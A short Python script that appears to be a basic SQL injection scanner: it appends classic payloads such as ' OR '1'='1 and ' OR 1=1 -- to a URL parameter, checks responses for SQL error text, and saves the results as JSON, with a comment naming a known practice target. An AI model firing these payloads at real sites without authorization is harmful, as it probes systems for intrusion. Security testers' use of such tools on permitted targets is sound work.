import requests
import json

# List of SQL injection payloads you want to test
payloads = [
    "'",
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"a\"=\"a"
]

def test_sql_injection(url):
    results = []  # Will hold results for all payloads

    for p in payloads:
        test_url = f"{url}{p}"  # Append payload to URL param
        try:
            r = requests.get(test_url, timeout=10)

            # Check response text for SQL error keywords
            is_error = any(word in r.text.lower() for word in ["sql syntax", "mysql", "unclosed quotation mark",
                                                                "syntax error", "warning"])

            results.append({
                "payload": p,
                "full_url": test_url,
                "status_code": r.status_code,
                "response_length": len(r.text),
                "possible_vulnerability": is_error
            })

        except requests.RequestException as e:
            results.append({
                "payload": p,
                "full_url": test_url,
                "error": str(e),
                "possible_vulnerability": False
            })

    return results

# Main program
target = input("Enter target URL (with parameter): ")
output = {
    "target_url": target,
    "results": test_sql_injection(target)
}

# Write the results to JSON file
with open("sqli_test_results.json", "w") as f:
    json.dump(output, f, indent=2)

print("Results saved in sqli_test_results.json")
print("Open the JSON file to view all payload test results.")



#http://testphp.vulnweb.com/listproducts.php?cat=